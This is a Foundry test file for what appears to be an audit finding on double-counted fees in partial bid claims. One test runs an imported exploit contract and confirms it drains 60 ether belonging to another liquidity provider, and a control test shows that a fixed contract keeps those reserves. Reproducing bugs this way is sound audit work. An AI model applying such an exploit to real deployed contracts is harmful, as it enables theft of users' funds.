// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Exploit, Quote, ProxyLOBFixed} from
    "./55151-double-counted-fees-in-partial-bid-claims-mixbytes-none-hanj.sol";

contract Finding55151Test is Test {
    function test_exploit_unfilled_fee_taken_from_other_lp() public {
        Exploit e = new Exploit();
        e.run();
        assertEq(e.stolen(), 60 ether, "phantom 60");
        assertEq(e.quote().balanceOf(address(this)), 60 ether, "caller received 60");
        assertEq(e.quote().balanceOf(address(e.lob())), 0, "pool empty");
        assertEq(e.lob().feeReturned(), 60 ether, "fee returned");
        assertEq(e.lob().passiveFeeRemoved(), 40 ether, "only executed fee removed");
    }

    function test_control_full_fee_leaves_reserves() public {
        Quote quote = new Quote();
        ProxyLOBFixed fixedLob = new ProxyLOBFixed(quote);
        quote.mint(address(fixedLob), 60 ether);
        quote.mint(address(this), 1_100 ether);
        quote.approve(address(fixedLob), 1_100 ether);
        fixedLob.placeBid(1_000, 1 ether, 0.1 ether);
        fixedLob.claimOrder(400, 1_000, 1 ether, false);
        assertEq(fixedLob.lobReservesByTokenId(), 0, "no phantom");
        assertEq(quote.balanceOf(address(fixedLob)), 60 ether, "other lp kept 60");
    }
}
